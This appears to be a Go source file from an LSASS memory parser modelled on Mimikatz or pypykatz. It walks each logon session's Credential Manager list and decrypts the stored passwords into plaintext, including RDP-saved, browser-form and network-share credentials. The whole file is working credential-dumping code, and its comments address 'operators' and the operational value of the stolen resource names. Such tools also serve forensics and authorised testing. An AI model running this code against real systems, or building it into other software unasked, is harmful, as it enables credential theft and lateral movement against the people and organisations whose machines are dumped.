package lsasparse

import (
	"encoding/binary"
	"fmt"
)

// CredManLayout captures per-build offsets inside a single
// KIWI_LSA_DPAPI_CREDMAN_LIST node. The CredMan walker is invoked
// from the MSV walk via MSVLayout.CredManListPtrOffset — there is
// no separate dll-global list for this provider, only a per-session
// pointer chain.
//
// Set NodeSize=0 to disable. Operators on builds where KvcForensic /
// pypykatz haven't published verified offsets register their own
// values via an extended Template (or override our defaults).
type CredManLayout struct {
	NodeSize uint32

	// UNICODE_STRING fields inside the node.
	UserNameOffset    uint32
	LogonDomainOffset uint32
	PasswordOffset    uint32 // encrypted; same lsaKey decrypt as MSV
	ResourceNameOffset uint32 // target resource (e.g., "TERMSRV/server")
}

// CredManCredential is one entry from a session's Credential Manager
// (Vault) list. CredMan stores RDP-saved sessions, IE/Edge form
// passwords, network-share credentials, and any other CredentialAdd
// (advapi32) entry whose persistence type is LOGON_SESSION.
//
// Password is the plaintext after LSA decrypt. ResourceName is the
// "target" string the application supplied at credential-save time
// — useful for filtering ("only TERMSRV/* credentials", etc.).
type CredManCredential struct {
	UserName     string
	LogonDomain  string
	Password     string
	ResourceName string
	Found        bool
}

// AuthPackage satisfies the Credential interface.
func (CredManCredential) AuthPackage() string { return "CredMan" }

// String renders ResourceName | Domain\User:Password — the resource
// is the most operationally meaningful field (tells the caller
// *what* the credential unlocks).
func (c CredManCredential) String() string {
	user := c.UserName
	if c.LogonDomain != "" {
		user = c.LogonDomain + `\` + user
	}
	if c.ResourceName != "" {
		return fmt.Sprintf("%s | %s:%s", c.ResourceName, user, c.Password)
	}
	return fmt.Sprintf("%s:%s", user, c.Password)
}

// wipe satisfies the optional wipe interface that Result.Wipe calls.
func (c *CredManCredential) wipe() {
	c.Password = ""
	c.Found = false
}

// extractCredMan walks a per-session CredMan list. The list head is
// the value at sessionNodeBytes[CredManListPtrOffset:+8] — the
// caller (decodeLogonSession) reads it then passes us the resulting
// VA. Returns one CredManCredential per node that produced a
// non-empty plaintext.
//
// Returns (nil, "") when the layout is disabled (NodeSize==0) or
// when the listHeadPtr is zero (session has no CredMan entries).
func extractCredMan(r *reader, listHeadPtr uint64, layout CredManLayout, lsaKey *lsaKey) ([]CredManCredential, string) {
	if layout.NodeSize == 0 || listHeadPtr == 0 {
		return nil, ""
	}

	// Read the LIST_ENTRY at listHeadPtr; Flink at +0 is the first
	// CredMan node (or listHeadPtr itself if the list is empty).
	flink, err := readPointer(r, listHeadPtr)
	if err != nil || flink == 0 || flink == listHeadPtr {
		return nil, ""
	}

	var (
		out     []CredManCredential
		warning string
	)

	const maxNodes = 256
	walked := 0
	for cur := flink; cur != listHeadPtr && walked < maxNodes; walked++ {
		node, err := r.ReadVA(cur, int(layout.NodeSize))
		if err != nil {
			warning = fmt.Sprintf("CredMan node @0x%X: %v", cur, err)
			break
		}
		if c, ok := decodeCredManNode(r, node, layout, lsaKey); ok {
			out = append(out, c)
		}
		next, err := readPointer(r, cur)
		if err != nil || next == 0 || next == cur {
			break
		}
		cur = next
	}
	return out, warning
}

// decodeCredManNode projects a node-bytes blob through the layout
// to a CredManCredential. Returns ok=false on any read failure or
// a fully-empty node (no Resource + no UserName + no Password).
func decodeCredManNode(r *reader, node []byte, layout CredManLayout, lsaKey *lsaKey) (CredManCredential, bool) {
	if uint32(len(node)) < layout.NodeSize {
		return CredManCredential{}, false
	}

	username := readUnicodeStringIfFits(r, node, layout.UserNameOffset, layout.NodeSize)
	domain := readUnicodeStringIfFits(r, node, layout.LogonDomainOffset, layout.NodeSize)
	resource := readUnicodeStringIfFits(r, node, layout.ResourceNameOffset, layout.NodeSize)

	// Password is encrypted; read length+ptr, fetch ciphertext, decrypt.
	var password string
	if layout.PasswordOffset+16 <= layout.NodeSize {
		field := node[layout.PasswordOffset : layout.PasswordOffset+16]
		pwdLen := binary.LittleEndian.Uint16(field[0:2])
		pwdBufPtr := binary.LittleEndian.Uint64(field[8:16])
		if pwdLen > 0 && pwdBufPtr != 0 {
			if ct, err := r.ReadVA(pwdBufPtr, int(pwdLen)); err == nil {
				if pt, err := decryptLSA(ct, lsaKey); err == nil {
					password = decodeUTF16LEBytes(pt)
				}
			}
		}
	}

	c := CredManCredential{
		UserName:     username,
		LogonDomain:  domain,
		Password:     password,
		ResourceName: resource,
		Found:        username != "" || password != "" || resource != "",
	}
	return c, c.Found
}

// readUnicodeStringIfFits is a bounds-checked wrapper around
// readUnicodeString — returns "" if the requested 16-byte field
// would extend past the node's NodeSize. Avoids a slice-bounds
// panic on a malformed Layout.
func readUnicodeStringIfFits(r *reader, node []byte, offset, nodeSize uint32) string {
	if offset == 0 || offset+16 > nodeSize {
		return ""
	}
	return readUnicodeString(r, node[offset:offset+16])
}
